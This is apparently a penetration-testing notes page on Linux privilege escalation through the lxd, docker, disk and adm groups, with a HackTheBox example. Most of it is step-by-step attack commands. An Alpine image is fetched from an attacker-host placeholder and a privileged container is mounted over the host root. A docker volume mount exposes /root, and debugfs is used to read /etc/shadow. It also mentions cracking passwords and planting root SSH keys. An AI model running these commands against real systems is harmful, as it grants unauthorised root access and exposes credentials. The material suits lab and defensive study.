---
title: lxd 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege escalation
  - linux
  - lxd
---
# lxd

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar to Docker and is Ubuntu's container manager. LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.

Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group.

[Source: https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/). In this article, you can find a good explanation about how lxc works. [Original source: https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071](https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071).

## Privileges escalation

Privilege escalation through lxd requires the access of local account and that that local account belongs to the group lxd.

### Create our own container with Alpine and transfer it to the target system
In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:

**Steps to be performed on the attacker machine:**

```bash
# Download build-alpine in your local machine through the git repository:
git clone https://github.com/saghul/lxd-alpine-builder.git

# Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
cd lxd-alpine-builder
sudo ./build-alpine

# This will generate a tar file that you need to transfer to the victim machine. For that you can copy that file to your /var/www/html folder and start apache2 service.
```

**Steps to be performed on the victim machine:**

```bash
# Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:
wget http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz

# After the image is built it can be added as an image to LXD as follows:
lxc image import ./alpine-v3.17-x86_64-20230508_0532.tar.gz --alias myimage

# List available images:
lxc image list

# Initiate your image inside a new container
lxc init myimage ignite -c security.privileged=true

# Mount the container inside the /root directory
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Initialize the container
lxc start ignite

# Launch a shell command in the container
lxc exec ignite /bin/sh

# Access the system via 
ls -l /mnt/root
```


#### Example from HackTheBox

Unzip the Alpine image.

```shell-session
 unzip alpine.zip 
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
lxd init

# List available images
lxc image list
```

Import the local image.

```shell-session
lxc image import alpine.tar.gz --alias alpine
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system.

```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.

```shell-session
lxc start r00t
lxc exec r00t /bin/sh
ls -l /mnt/root
```

## Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers:

```
docker run -v /root:/mnt -it ubuntu
```

This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

## Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.

**1.** Check if the user is in the `disk` group

```
id
```

**2.** Identify the disk partitions available

```
lsblk
```

**3.** Look for partitions like /dev/sda1, which usually contains the root filesystem. Open the filesystem with debugfs

```
sudo debugfs /dev/sda1
# If you already have disk group privileges, sudo is not required.
```

**4.**  Access and read sensitive files (e.g., /etc/shadow)

```
cat /etc/shadow
```

## ADM 

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.


## Related labs

[HackTheBox machine Included](htb-included.md).

